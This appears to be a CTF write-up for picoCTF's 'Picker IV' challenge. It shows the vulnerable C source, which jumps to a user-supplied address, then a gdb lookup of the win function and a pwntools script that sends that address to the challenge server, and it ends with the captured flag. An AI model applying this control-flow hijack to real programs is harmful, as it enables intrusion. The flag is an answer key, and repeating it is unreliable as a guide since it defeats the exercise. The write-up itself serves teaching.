# Writeup - Picker IV
Category: Binary Exploitation, Points: 100


## Description

> Can you figure out how this program works to get the flag?

Connect to the program with netcat:
`$ nc saturn.picoctf.net 61939`

We are given a binary and a source file after launching the challenge instance.


## Vulnerability

Given source 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
    printf("Cannot open file.\n");
    exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
    printf ("%c", c);
    c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

In the program `foo` is assigned to the `val` variable. And `val` is the user input.


## Exploit

We have to give the `win` function's `hex` address as input, to get the flag.

GDB the binary file and get `win` function's address.

```console
gef➤  disas win
Dump of assembler code for function win:
   0x000000000040129e <+0>:	endbr64
```

`win` function's address is `40129e`

give this address as input and you should get your flag.

Exploit:

```python
import sys

from pwn import *

io = process("./picker-IV") if sys.argv[1] != "remote" else remote("saturn.picoctf.net", "65056")
addr = "0040129e"
io.recvuntil("Enter the address in hex to jump to, excluding '0x':")
io.sendline(addr)
log.info(f"sent address {addr}!")
info(io.recvuntil("}"))
io.close()
```


## Flag
`picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}`
